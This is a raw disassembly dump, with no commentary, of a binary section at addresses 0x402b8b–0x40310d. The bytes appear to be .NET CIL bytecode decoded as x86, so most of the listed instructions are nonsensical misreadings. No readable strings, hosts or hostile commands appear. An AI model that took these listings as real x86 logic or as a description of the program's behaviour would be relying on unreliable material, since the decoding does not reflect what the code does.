  402b8b:	14 20                	adc    $0x20,%al
  402b8d:	c0 00 00             	rolb   $0x0,(%eax)
  402b90:	00 16                	add    %dl,(%esi)
  402b92:	6f                   	outsl  %ds:(%esi),(%dx)
  402b93:	39 00                	cmp    %eax,(%eax)
  402b95:	00 0a                	add    %cl,(%edx)
  402b97:	1a 6a 28             	sbb    0x28(%edx),%ch
  402b9a:	0d 00 00 06 28       	or     $0x28060000,%eax
  402b9f:	0c 00                	or     $0x0,%al
  402ba1:	00 06                	add    %al,(%esi)
  402ba3:	d4 8d                	aam    $0x8d
  402ba5:	44                   	inc    %esp
  402ba6:	00 00                	add    %al,(%eax)
  402ba8:	01 28                	add    %ebp,(%eax)
  402baa:	0b 00                	or     (%eax),%eax
  402bac:	00 06                	add    %al,(%esi)
  402bae:	16                   	push   %ss
  402baf:	6a 28                	push   $0x28
  402bb1:	0f 00 00             	sldt   (%eax)
  402bb4:	06                   	push   %es
  402bb5:	28 2f                	sub    %ch,(%edi)
  402bb7:	00 00                	add    %al,(%eax)
  402bb9:	06                   	push   %es
  402bba:	28 20                	sub    %ah,(%eax)
  402bbc:	00 00                	add    %al,(%eax)
  402bbe:	06                   	push   %es
  402bbf:	16                   	push   %ss
  402bc0:	28 18                	sub    %bl,(%eax)
  402bc2:	00 00                	add    %al,(%eax)
  402bc4:	06                   	push   %es
  402bc5:	16                   	push   %ss
  402bc6:	28 1a                	sub    %bl,(%edx)
  402bc8:	00 00                	add    %al,(%eax)
  402bca:	06                   	push   %es
  402bcb:	14 fe                	adc    $0xfe,%al
  402bcd:	06                   	push   %es
  402bce:	21 00                	and    %eax,(%eax)
  402bd0:	00 06                	add    %al,(%esi)
  402bd2:	73 3a                	jae    0x402c0e
  402bd4:	00 00                	add    %al,(%eax)
  402bd6:	0a 14 73             	or     (%ebx,%esi,2),%dl
  402bd9:	27                   	daa
  402bda:	00 00                	add    %al,(%eax)
  402bdc:	0a 20                	or     (%eax),%ah
  402bde:	10 27                	adc    %ah,(%edi)
  402be0:	00 00                	add    %al,(%eax)
  402be2:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402be8:	32 00                	xor    (%eax),%al
  402bea:	00 0a                	add    %cl,(%edx)
  402bec:	73 27                	jae    0x402c15
  402bee:	00 00                	add    %al,(%eax)
  402bf0:	0a 20                	or     (%eax),%ah
  402bf2:	10 27                	adc    %ah,(%edi)
  402bf4:	00 00                	add    %al,(%eax)
  402bf6:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402bfc:	32 00                	xor    (%eax),%al
  402bfe:	00 0a                	add    %cl,(%edx)
  402c00:	73 3b                	jae    0x402c3d
  402c02:	00 00                	add    %al,(%eax)
  402c04:	0a 28                	or     (%eax),%ch
  402c06:	11 00                	adc    %eax,(%eax)
  402c08:	00 06                	add    %al,(%esi)
  402c0a:	14 fe                	adc    $0xfe,%al
  402c0c:	06                   	push   %es
  402c0d:	22 00                	and    (%eax),%al
  402c0f:	00 06                	add    %al,(%esi)
  402c11:	73 3a                	jae    0x402c4d
  402c13:	00 00                	add    %al,(%eax)
  402c15:	0a 14 17             	or     (%edi,%edx,1),%dl
  402c18:	17                   	pop    %ss
  402c19:	73 3b                	jae    0x402c56
  402c1b:	00 00                	add    %al,(%eax)
  402c1d:	0a 28                	or     (%eax),%ch
  402c1f:	16                   	push   %ss
  402c20:	00 00                	add    %al,(%eax)
  402c22:	06                   	push   %es
  402c23:	28 08                	sub    %cl,(%eax)
  402c25:	00 00                	add    %al,(%eax)
  402c27:	06                   	push   %es
  402c28:	28 0a                	sub    %cl,(%edx)
  402c2a:	00 00                	add    %al,(%eax)
  402c2c:	06                   	push   %es
  402c2d:	28 0e                	sub    %cl,(%esi)
  402c2f:	00 00                	add    %al,(%eax)
  402c31:	06                   	push   %es
  402c32:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402c38:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402c3f:	06                   	push   %es
  402c40:	73 3c                	jae    0x402c7e
  402c42:	00 00                	add    %al,(%eax)
  402c44:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402c47:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402c4c:	38 06                	cmp    %al,(%esi)
  402c4e:	00 00                	add    %al,(%eax)
  402c50:	00 16                	add    %dl,(%esi)
  402c52:	28 13                	sub    %dl,(%ebx)
  402c54:	00 00                	add    %al,(%eax)
  402c56:	06                   	push   %es
  402c57:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402c5a:	00 00                	add    %al,(%eax)
  402c5c:	26 16                	es push %ss
  402c5e:	28 13                	sub    %dl,(%ebx)
  402c60:	00 00                	add    %al,(%eax)
  402c62:	06                   	push   %es
  402c63:	dd 00                	fldl   (%eax)
  402c65:	00 00                	add    %al,(%eax)
  402c67:	00 2a                	add    %ch,(%edx)
  402c69:	00 00                	add    %al,(%eax)
  402c6b:	00 41 4c             	add    %al,0x4c(%ecx)
  402c6e:	00 00                	add    %al,(%eax)
  402c70:	00 00                	add    %al,(%eax)
  402c72:	00 00                	add    %al,(%eax)
  402c74:	ce                   	into
  402c75:	00 00                	add    %al,(%eax)
  402c77:	00 26                	add    %ah,(%esi)
  402c79:	00 00                	add    %al,(%eax)
  402c7b:	00 f4                	add    %dh,%ah
  402c7d:	00 00                	add    %al,(%eax)
  402c7f:	00 06                	add    %al,(%esi)
  402c81:	00 00                	add    %al,(%eax)
  402c83:	00 01                	add    %al,(%ecx)
  402c85:	00 00                	add    %al,(%eax)
  402c87:	01 02                	add    %eax,(%edx)
  402c89:	00 00                	add    %al,(%eax)
  402c8b:	00 21                	add    %ah,(%ecx)
  402c8d:	01 00                	add    %eax,(%eax)
  402c8f:	00 82 00 00 00 a3    	add    %al,-0x5d000000(%edx)
  402c95:	01 00                	add    %eax,(%eax)
  402c97:	00 0f                	add    %cl,(%edi)
	...
  402ca5:	00 00                	add    %al,(%eax)
  402ca7:	00 e4                	add    %ah,%ah
  402ca9:	02 00                	add    (%eax),%al
  402cab:	00 e4                	add    %ah,%ah
  402cad:	02 00                	add    (%eax),%al
  402caf:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402cb2:	00 00                	add    %al,(%eax)
  402cb4:	01 00                	add    %eax,(%eax)
  402cb6:	00 01                	add    %al,(%ecx)
  402cb8:	1b 30                	sbb    (%eax),%esi
  402cba:	02 00                	add    (%eax),%al
  402cbc:	6a 00                	push   $0x0
  402cbe:	00 00                	add    %al,(%eax)
  402cc0:	00 00                	add    %al,(%eax)
  402cc2:	00 00                	add    %al,(%eax)
  402cc4:	28 08                	sub    %cl,(%eax)
  402cc6:	00 00                	add    %al,(%eax)
  402cc8:	06                   	push   %es
  402cc9:	25 3a 06 00 00       	and    $0x63a,%eax
  402cce:	00 26                	add    %ah,(%esi)
  402cd0:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cd6:	40                   	inc    %eax
  402cd7:	00 00                	add    %al,(%eax)
  402cd9:	0a 28                	or     (%eax),%ch
  402cdb:	06                   	push   %es
  402cdc:	00 00                	add    %al,(%eax)
  402cde:	06                   	push   %es
  402cdf:	25 3a 06 00 00       	and    $0x63a,%eax
  402ce4:	00 26                	add    %ah,(%esi)
  402ce6:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cec:	41                   	inc    %ecx
  402ced:	00 00                	add    %al,(%eax)
  402cef:	0a 28                	or     (%eax),%ch
  402cf1:	15 00 00 06 25       	adc    $0x25060000,%eax
  402cf6:	3a 06                	cmp    (%esi),%al
  402cf8:	00 00                	add    %al,(%eax)
  402cfa:	00 26                	add    %ah,(%esi)
  402cfc:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d02:	42                   	inc    %edx
  402d03:	00 00                	add    %al,(%eax)
  402d05:	0a 28                	or     (%eax),%ch
  402d07:	10 00                	adc    %al,(%eax)
  402d09:	00 06                	add    %al,(%esi)
  402d0b:	25 3a 06 00 00       	and    $0x63a,%eax
  402d10:	00 26                	add    %ah,(%esi)
  402d12:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d18:	42                   	inc    %edx
  402d19:	00 00                	add    %al,(%eax)
  402d1b:	0a dd                	or     %ch,%bl
  402d1d:	06                   	push   %es
  402d1e:	00 00                	add    %al,(%eax)
  402d20:	00 26                	add    %ah,(%esi)
  402d22:	dd 00                	fldl   (%eax)
  402d24:	00 00                	add    %al,(%eax)
  402d26:	00 16                	add    %dl,(%esi)
  402d28:	28 13                	sub    %dl,(%ebx)
  402d2a:	00 00                	add    %al,(%eax)
  402d2c:	06                   	push   %es
  402d2d:	2a 00                	sub    (%eax),%al
  402d2f:	00 01                	add    %al,(%ecx)
  402d31:	10 00                	adc    %al,(%eax)
  402d33:	00 00                	add    %al,(%eax)
  402d35:	00 00                	add    %al,(%eax)
  402d37:	00 5d 5d             	add    %bl,0x5d(%ebp)
  402d3a:	00 06                	add    %al,(%esi)
  402d3c:	01 00                	add    %eax,(%eax)
  402d3e:	00 01                	add    %al,(%ecx)
  402d40:	1b 30                	sbb    (%eax),%esi
  402d42:	06                   	push   %es
  402d43:	00 ba 01 00 00 04    	add    %bh,0x4000001(%edx)
  402d49:	00 00                	add    %al,(%eax)
  402d4b:	11 28                	adc    %ebp,(%eax)
  402d4d:	06                   	push   %es
  402d4e:	00 00                	add    %al,(%eax)
  402d50:	06                   	push   %es
  402d51:	6f                   	outsl  %ds:(%esi),(%dx)
  402d52:	2b 00                	sub    (%eax),%eax
  402d54:	00 0a                	add    %cl,(%edx)
  402d56:	39 0a                	cmp    %ecx,(%edx)
  402d58:	00 00                	add    %al,(%eax)
  402d5a:	00 28                	add    %ch,(%eax)
  402d5c:	12 00                	adc    (%eax),%al
  402d5e:	00 06                	add    %al,(%esi)
  402d60:	3a 0b                	cmp    (%ebx),%cl
  402d62:	00 00                	add    %al,(%eax)
  402d64:	00 16                	add    %dl,(%esi)
  402d66:	28 13                	sub    %dl,(%ebx)
  402d68:	00 00                	add    %al,(%eax)
  402d6a:	06                   	push   %es
  402d6b:	dd 95 01 00 00 28    	fstl   0x28000001(%ebp)
  402d71:	08 00                	or     %al,(%eax)
  402d73:	00 06                	add    %al,(%esi)
  402d75:	02 6f 43             	add    0x43(%edi),%ch
  402d78:	00 00                	add    %al,(%eax)
  402d7a:	0a 0a                	or     (%edx),%cl
  402d7c:	06                   	push   %es
  402d7d:	16                   	push   %ss
  402d7e:	3e 6b 01 00          	imul   $0x0,%ds:(%ecx),%eax
  402d82:	00 28                	add    %ch,(%eax)
  402d84:	0e                   	push   %cs
  402d85:	00 00                	add    %al,(%eax)
  402d87:	06                   	push   %es
  402d88:	06                   	push   %es
  402d89:	6a 58                	push   $0x58
  402d8b:	28 0f                	sub    %cl,(%edi)
  402d8d:	00 00                	add    %al,(%eax)
  402d8f:	06                   	push   %es
  402d90:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402d93:	00 06                	add    %al,(%esi)
  402d95:	06                   	push   %es
  402d96:	6a 59                	push   $0x59
  402d98:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402d9e:	0c 00                	or     $0x0,%al
  402da0:	00 06                	add    %al,(%esi)
  402da2:	3a 02                	cmp    (%edx),%al
  402da4:	01 00                	add    %eax,(%eax)
  402da6:	00 28                	add    %ch,(%eax)
  402da8:	0a 00                	or     (%eax),%al
  402daa:	00 06                	add    %al,(%esi)
  402dac:	16                   	push   %ss
  402dad:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  402db1:	0a 6a 28             	or     0x28(%edx),%ch
  402db4:	0d 00 00 06 28       	or     $0x28060000,%eax
  402db9:	0c 00                	or     $0x0,%al
  402dbb:	00 06                	add    %al,(%esi)
  402dbd:	16                   	push   %ss
  402dbe:	6a 3e                	push   $0x3e
  402dc0:	c2 00 00             	ret    $0x0
  402dc3:	00 16                	add    %dl,(%esi)
  402dc5:	6a 28                	push   $0x28
  402dc7:	0f 00 00             	sldt   (%eax)
  402dca:	06                   	push   %es
  402dcb:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402dce:	00 06                	add    %al,(%esi)
  402dd0:	d4 8d                	aam    $0x8d
  402dd2:	44                   	inc    %esp
  402dd3:	00 00                	add    %al,(%eax)
  402dd5:	01 28                	add    %ebp,(%eax)
  402dd7:	0b 00                	or     (%eax),%eax
  402dd9:	00 06                	add    %al,(%esi)
  402ddb:	38 5f 00             	cmp    %bl,0x0(%edi)
  402dde:	00 00                	add    %al,(%eax)
  402de0:	28 08                	sub    %cl,(%eax)
  402de2:	00 00                	add    %al,(%eax)
  402de4:	06                   	push   %es
  402de5:	28 0a                	sub    %cl,(%edx)
  402de7:	00 00                	add    %al,(%eax)
  402de9:	06                   	push   %es
  402dea:	28 0e                	sub    %cl,(%esi)
  402dec:	00 00                	add    %al,(%eax)
  402dee:	06                   	push   %es
  402def:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402df5:	69 6f 45 00 00 0a 0b 	imul   $0xb0a0000,0x45(%edi),%ebp
  402dfc:	07                   	pop    %es
  402dfd:	16                   	push   %ss
  402dfe:	3d 0b 00 00 00       	cmp    $0xb,%eax
  402e03:	16                   	push   %ss
  402e04:	28 13                	sub    %dl,(%ebx)
  402e06:	00 00                	add    %al,(%eax)
  402e08:	06                   	push   %es
  402e09:	dd f7                	(bad)
  402e0b:	00 00                	add    %al,(%eax)
  402e0d:	00 28                	add    %ch,(%eax)
  402e0f:	0e                   	push   %cs
  402e10:	00 00                	add    %al,(%eax)
  402e12:	06                   	push   %es
  402e13:	07                   	pop    %es
  402e14:	6a 58                	push   $0x58
  402e16:	28 0f                	sub    %cl,(%edi)
  402e18:	00 00                	add    %al,(%eax)
  402e1a:	06                   	push   %es
  402e1b:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402e1e:	00 06                	add    %al,(%esi)
  402e20:	07                   	pop    %es
  402e21:	6a 59                	push   $0x59
  402e23:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402e29:	0c 00                	or     $0x0,%al
  402e2b:	00 06                	add    %al,(%esi)
  402e2d:	16                   	push   %ss
  402e2e:	6a 3c                	push   $0x3c
  402e30:	0b 00                	or     (%eax),%eax
  402e32:	00 00                	add    %al,(%eax)
  402e34:	16                   	push   %ss
  402e35:	28 13                	sub    %dl,(%ebx)
  402e37:	00 00                	add    %al,(%eax)
  402e39:	06                   	push   %es
  402e3a:	dd c6                	ffree  %st(6)
  402e3c:	00 00                	add    %al,(%eax)
  402e3e:	00 28                	add    %ch,(%eax)
  402e40:	0c 00                	or     $0x0,%al
  402e42:	00 06                	add    %al,(%esi)
  402e44:	16                   	push   %ss
  402e45:	6a 30                	push   $0x30
  402e47:	98                   	cwtl
  402e48:	14 fe                	adc    $0xfe,%al
  402e4a:	06                   	push   %es
  402e4b:	46                   	inc    %esi
  402e4c:	00 00                	add    %al,(%eax)
  402e4e:	06                   	push   %es
  402e4f:	73 46                	jae    0x402e97
  402e51:	00 00                	add    %al,(%eax)
  402e53:	0a 73 47             	or     0x47(%ebx),%dh
  402e56:	00 00                	add    %al,(%eax)
  402e58:	0a 28                	or     (%eax),%ch
  402e5a:	0a 00                	or     (%eax),%al
  402e5c:	00 06                	add    %al,(%esi)
  402e5e:	6f                   	outsl  %ds:(%esi),(%dx)
  402e5f:	48                   	dec    %eax
  402e60:	00 00                	add    %al,(%eax)
  402e62:	0a 16                	or     (%esi),%dl
  402e64:	6a 28                	push   $0x28
  402e66:	0f 00 00             	sldt   (%eax)
  402e69:	06                   	push   %es
  402e6a:	1a 6a 28             	sbb    0x28(%edx),%ch
  402e6d:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e72:	0c 00                	or     $0x0,%al
  402e74:	00 06                	add    %al,(%esi)
  402e76:	d4 8d                	aam    $0x8d
  402e78:	44                   	inc    %esp
  402e79:	00 00                	add    %al,(%eax)
  402e7b:	01 28                	add    %ebp,(%eax)
  402e7d:	0b 00                	or     (%eax),%eax
  402e7f:	00 06                	add    %al,(%esi)
  402e81:	38 3a                	cmp    %bh,(%edx)
  402e83:	00 00                	add    %al,(%eax)
  402e85:	00 1a                	add    %bl,(%edx)
  402e87:	6a 28                	push   $0x28
  402e89:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e8e:	0c 00                	or     $0x0,%al
  402e90:	00 06                	add    %al,(%esi)
  402e92:	d4 8d                	aam    $0x8d
  402e94:	44                   	inc    %esp
  402e95:	00 00                	add    %al,(%eax)
  402e97:	01 28                	add    %ebp,(%eax)
  402e99:	0b 00                	or     (%eax),%eax
  402e9b:	00 06                	add    %al,(%esi)
  402e9d:	16                   	push   %ss
  402e9e:	6a 28                	push   $0x28
  402ea0:	0f 00 00             	sldt   (%eax)
  402ea3:	06                   	push   %es
  402ea4:	38 17                	cmp    %dl,(%edi)
  402ea6:	00 00                	add    %al,(%eax)
  402ea8:	00 28                	add    %ch,(%eax)
  402eaa:	0c 00                	or     $0x0,%al
  402eac:	00 06                	add    %al,(%esi)
  402eae:	16                   	push   %ss
  402eaf:	6a 3c                	push   $0x3c
  402eb1:	0b 00                	or     (%eax),%eax
  402eb3:	00 00                	add    %al,(%eax)
  402eb5:	16                   	push   %ss
  402eb6:	28 13                	sub    %dl,(%ebx)
  402eb8:	00 00                	add    %al,(%eax)
  402eba:	06                   	push   %es
  402ebb:	dd 45 00             	fldl   0x0(%ebp)
  402ebe:	00 00                	add    %al,(%eax)
  402ec0:	28 08                	sub    %cl,(%eax)
  402ec2:	00 00                	add    %al,(%eax)
  402ec4:	06                   	push   %es
  402ec5:	28 0a                	sub    %cl,(%edx)
  402ec7:	00 00                	add    %al,(%eax)
  402ec9:	06                   	push   %es
  402eca:	28 0e                	sub    %cl,(%esi)
  402ecc:	00 00                	add    %al,(%eax)
  402ece:	06                   	push   %es
  402ecf:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402ed5:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402edc:	06                   	push   %es
  402edd:	73 3c                	jae    0x402f1b
  402edf:	00 00                	add    %al,(%eax)
  402ee1:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402ee4:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402ee9:	38 06                	cmp    %al,(%esi)
  402eeb:	00 00                	add    %al,(%eax)
  402eed:	00 16                	add    %dl,(%esi)
  402eef:	28 13                	sub    %dl,(%ebx)
  402ef1:	00 00                	add    %al,(%eax)
  402ef3:	06                   	push   %es
  402ef4:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402ef7:	00 00                	add    %al,(%eax)
  402ef9:	26 16                	es push %ss
  402efb:	28 13                	sub    %dl,(%ebx)
  402efd:	00 00                	add    %al,(%eax)
  402eff:	06                   	push   %es
  402f00:	dd 00                	fldl   (%eax)
  402f02:	00 00                	add    %al,(%eax)
  402f04:	00 2a                	add    %ch,(%edx)
  402f06:	00 00                	add    %al,(%eax)
  402f08:	41                   	inc    %ecx
  402f09:	1c 00                	sbb    $0x0,%al
	...
  402f13:	00 ad 01 00 00 ad    	add    %ch,-0x52ffffff(%ebp)
  402f19:	01 00                	add    %eax,(%eax)
  402f1b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402f1e:	00 00                	add    %al,(%eax)
  402f20:	01 00                	add    %eax,(%eax)
  402f22:	00 01                	add    %al,(%ecx)
  402f24:	1b 30                	sbb    (%eax),%esi
  402f26:	04 00                	add    $0x0,%al
  402f28:	04 01                	add    $0x1,%al
  402f2a:	00 00                	add    %al,(%eax)
  402f2c:	05 00 00 11 28       	add    $0x28110000,%eax
  402f31:	14 00                	adc    $0x0,%al
  402f33:	00 06                	add    %al,(%esi)
  402f35:	0a 16                	or     (%esi),%dl
  402f37:	0b 06                	or     (%esi),%eax
  402f39:	12 01                	adc    (%ecx),%al
  402f3b:	28 49 00             	sub    %cl,0x0(%ecx)
  402f3e:	00 0a                	add    %cl,(%edx)
  402f40:	28 12                	sub    %dl,(%edx)
  402f42:	00 00                	add    %al,(%eax)
  402f44:	06                   	push   %es
  402f45:	3a 05 00 00 00 dd    	cmp    0xdd000000,%al
  402f4b:	e4 00                	in     $0x0,%al
  402f4d:	00 00                	add    %al,(%eax)
  402f4f:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  402f55:	00 0a                	add    %cl,(%edx)
  402f57:	0c 28                	or     $0x28,%al
  402f59:	06                   	push   %es
  402f5a:	00 00                	add    %al,(%eax)
  402f5c:	06                   	push   %es
  402f5d:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402f62:	00 0a                	add    %cl,(%edx)
  402f64:	26 28 08             	sub    %cl,%es:(%eax)
  402f67:	00 00                	add    %al,(%eax)
  402f69:	06                   	push   %es
  402f6a:	08 16                	or     %dl,(%esi)
  402f6c:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  402f72:	00 0a                	add    %cl,(%edx)
  402f74:	02 8e 69 20 40 42    	add    0x42402069(%esi),%cl
  402f7a:	0f 00                	(bad)
  402f7c:	3e 6e                	outsb  %ds:(%esi),(%dx)
  402f7e:	00 00                	add    %al,(%eax)
  402f80:	00 02                	add    %al,(%edx)
  402f82:	73 4d                	jae    0x402fd1
  402f84:	00 00                	add    %al,(%eax)
  402f86:	0a 0d 16 13 04 09    	or     0x9041316,%cl
  402f8c:	16                   	push   %ss
  402f8d:	6a 6f                	push   $0x6f
  402f8f:	4e                   	dec    %esi
  402f90:	00 00                	add    %al,(%eax)
  402f92:	0a 20                	or     (%eax),%ah
  402f94:	50                   	push   %eax
  402f95:	c3                   	ret
  402f96:	00 00                	add    %al,(%eax)
  402f98:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  402f9c:	01 13                	add    %edx,(%ebx)
  402f9e:	05 38 26 00 00       	add    $0x2638,%eax
  402fa3:	00 28                	add    %ch,(%eax)
  402fa5:	06                   	push   %es
  402fa6:	00 00                	add    %al,(%eax)
  402fa8:	06                   	push   %es
  402fa9:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402fae:	00 0a                	add    %cl,(%edx)
  402fb0:	26 28 08             	sub    %cl,%es:(%eax)
  402fb3:	00 00                	add    %al,(%eax)
  402fb5:	06                   	push   %es
  402fb6:	11 05 16 11 04 6f    	adc    %eax,0x6f041116
  402fbc:	4c                   	dec    %esp
  402fbd:	00 00                	add    %al,(%eax)
  402fbf:	0a 28                	or     (%eax),%ch
  402fc1:	08 00                	or     %al,(%eax)
  402fc3:	00 06                	add    %al,(%esi)
  402fc5:	6f                   	outsl  %ds:(%esi),(%dx)
  402fc6:	4f                   	dec    %edi
  402fc7:	00 00                	add    %al,(%eax)
  402fc9:	0a 09                	or     (%ecx),%cl
  402fcb:	11 05 16 11 05 8e    	adc    %eax,0x8e051116
  402fd1:	69 6f 45 00 00 0a 25 	imul   $0x250a0000,0x45(%edi),%ebp
  402fd8:	13 04 16             	adc    (%esi,%edx,1),%eax
  402fdb:	30 c7                	xor    %al,%bh
  402fdd:	dd 33                	fnsave (%ebx)
  402fdf:	00 00                	add    %al,(%eax)
  402fe1:	00 09                	add    %cl,(%ecx)
  402fe3:	39 06                	cmp    %eax,(%esi)
  402fe5:	00 00                	add    %al,(%eax)
  402fe7:	00 09                	add    %cl,(%ecx)
  402fe9:	6f                   	outsl  %ds:(%esi),(%dx)
  402fea:	33 00                	xor    (%eax),%eax
  402fec:	00 0a                	add    %cl,(%edx)
  402fee:	dc 28                	fsubrl (%eax)
  402ff0:	06                   	push   %es
  402ff1:	00 00                	add    %al,(%eax)
  402ff3:	06                   	push   %es
  402ff4:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402ff9:	00 0a                	add    %cl,(%edx)
  402ffb:	26 28 08             	sub    %cl,%es:(%eax)
  402ffe:	00 00                	add    %al,(%eax)
  403000:	06                   	push   %es
  403001:	02 16                	add    (%esi),%dl
  403003:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  403009:	00 0a                	add    %cl,(%edx)
  40300b:	28 08                	sub    %cl,(%eax)
  40300d:	00 00                	add    %al,(%eax)
  40300f:	06                   	push   %es
  403010:	6f                   	outsl  %ds:(%esi),(%dx)
  403011:	4f                   	dec    %edi
  403012:	00 00                	add    %al,(%eax)
  403014:	0a dd                	or     %ch,%bl
  403016:	19 00                	sbb    %eax,(%eax)
  403018:	00 00                	add    %al,(%eax)
  40301a:	26 16                	es push %ss
  40301c:	28 13                	sub    %dl,(%ebx)
  40301e:	00 00                	add    %al,(%eax)
  403020:	06                   	push   %es
  403021:	dd 0d 00 00 00 07    	fisttpll 0x7000000
  403027:	39 06                	cmp    %eax,(%esi)
  403029:	00 00                	add    %al,(%eax)
  40302b:	00 06                	add    %al,(%esi)
  40302d:	28 50 00             	sub    %dl,0x0(%eax)
  403030:	00 0a                	add    %cl,(%edx)
  403032:	dc 2a                	fsubrl (%edx)
  403034:	01 28                	add    %ebp,(%eax)
  403036:	00 00                	add    %al,(%eax)
  403038:	02 00                	add    (%eax),%al
  40303a:	58                   	pop    %eax
  40303b:	00 5a b2             	add    %bl,-0x4e(%edx)
  40303e:	00 0d 00 00 00 00    	add    %cl,0x0
  403044:	00 00                	add    %al,(%eax)
  403046:	10 00                	adc    %al,(%eax)
  403048:	da ea                	(bad)
  40304a:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40304d:	00 00                	add    %al,(%eax)
  40304f:	01 02                	add    %eax,(%edx)
  403051:	00 08                	add    %cl,(%eax)
  403053:	00 ee                	add    %ch,%dh
  403055:	f6 00 0d             	testb  $0xd,(%eax)
  403058:	00 00                	add    %al,(%eax)
  40305a:	00 00                	add    %al,(%eax)
  40305c:	1b 30                	sbb    (%eax),%esi
  40305e:	03 00                	add    (%eax),%eax
  403060:	50                   	push   %eax
  403061:	00 00                	add    %al,(%eax)
  403063:	00 00                	add    %al,(%eax)
  403065:	00 00                	add    %al,(%eax)
  403067:	00 73 94             	add    %dh,-0x6c(%ebx)
  40306a:	00 00                	add    %al,(%eax)
  40306c:	06                   	push   %es
  40306d:	25 72 0a 22 00       	and    $0x220a72,%eax
  403072:	70 6f                	jo     0x4030e3
  403074:	7f 00                	jg     0x403076
  403076:	00 06                	add    %al,(%esi)
  403078:	72 18                	jb     0x403092
  40307a:	22 00                	and    (%eax),%al
  40307c:	70 6f                	jo     0x4030ed
  40307e:	8c 00                	mov    %es,(%eax)
  403080:	00 06                	add    %al,(%esi)
  403082:	25 72 22 22 00       	and    $0x222272,%eax
  403087:	70 6f                	jo     0x4030f8
  403089:	7f 00                	jg     0x40308b
  40308b:	00 06                	add    %al,(%esi)
  40308d:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  403093:	8c 00                	mov    %es,(%eax)
  403095:	00 06                	add    %al,(%esi)
  403097:	6f                   	outsl  %ds:(%esi),(%dx)
  403098:	89 00                	mov    %eax,(%eax)
  40309a:	00 06                	add    %al,(%esi)
  40309c:	28 20                	sub    %ah,(%eax)
  40309e:	00 00                	add    %al,(%eax)
  4030a0:	06                   	push   %es
  4030a1:	28 51 00             	sub    %dl,0x0(%ecx)
  4030a4:	00 0a                	add    %cl,(%edx)
  4030a6:	17                   	pop    %ss
  4030a7:	28 1a                	sub    %bl,(%edx)
  4030a9:	00 00                	add    %al,(%eax)
  4030ab:	06                   	push   %es
  4030ac:	dd 06                	fldl   (%esi)
  4030ae:	00 00                	add    %al,(%eax)
  4030b0:	00 26                	add    %ah,(%esi)
  4030b2:	dd 00                	fldl   (%eax)
  4030b4:	00 00                	add    %al,(%eax)
  4030b6:	00 2a                	add    %ch,(%edx)
  4030b8:	01 10                	add    %edx,(%eax)
  4030ba:	00 00                	add    %al,(%eax)
  4030bc:	00 00                	add    %al,(%eax)
  4030be:	00 00                	add    %al,(%eax)
  4030c0:	49                   	dec    %ecx
  4030c1:	49                   	dec    %ecx
  4030c2:	00 06                	add    %al,(%esi)
  4030c4:	01 00                	add    %eax,(%eax)
  4030c6:	00 01                	add    %al,(%ecx)
  4030c8:	1b 30                	sbb    (%eax),%esi
  4030ca:	02 00                	add    (%eax),%al
  4030cc:	2c 00                	sub    $0x0,%al
  4030ce:	00 00                	add    %al,(%eax)
  4030d0:	00 00                	add    %al,(%eax)
  4030d2:	00 00                	add    %al,(%eax)
  4030d4:	28 19                	sub    %bl,(%ecx)
  4030d6:	00 00                	add    %al,(%eax)
  4030d8:	06                   	push   %es
  4030d9:	39 16                	cmp    %edx,(%esi)
  4030db:	00 00                	add    %al,(%eax)
  4030dd:	00 28                	add    %ch,(%eax)
  4030df:	12 00                	adc    (%eax),%al
  4030e1:	00 06                	add    %al,(%esi)
  4030e3:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4030e6:	00 00                	add    %al,(%eax)
  4030e8:	28 17                	sub    %dl,(%edi)
  4030ea:	00 00                	add    %al,(%eax)
  4030ec:	06                   	push   %es
  4030ed:	17                   	pop    %ss
  4030ee:	58                   	pop    %eax
  4030ef:	28 18                	sub    %bl,(%eax)
  4030f1:	00 00                	add    %al,(%eax)
  4030f3:	06                   	push   %es
  4030f4:	dd 06                	fldl   (%esi)
  4030f6:	00 00                	add    %al,(%eax)
  4030f8:	00 26                	add    %ah,(%esi)
  4030fa:	dd 00                	fldl   (%eax)
  4030fc:	00 00                	add    %al,(%eax)
  4030fe:	00 2a                	add    %ch,(%edx)
  403100:	01 10                	add    %edx,(%eax)
  403102:	00 00                	add    %al,(%eax)
  403104:	00 00                	add    %al,(%eax)
  403106:	00 00                	add    %al,(%eax)
  403108:	25 25 00 06 01       	and    $0x1060025,%eax
  40310d:	00 00                	add    %al,(%eax)
